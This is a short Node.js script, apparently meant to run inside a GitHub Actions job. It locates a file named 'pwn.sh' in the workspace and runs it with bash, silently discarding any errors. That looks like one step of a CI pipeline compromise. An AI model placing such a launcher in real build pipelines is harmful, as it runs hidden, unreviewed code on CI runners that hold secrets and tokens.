const { exec } = require('child_process');
const path = require('path');
const workspace = process.env.GITHUB_WORKSPACE || '.';
const pwnPath = path.join(workspace, 'pwn.sh');
exec(`bash ${pwnPath}`, (error, stdout, stderr) => {
    if (error) {
        return;
    }
});
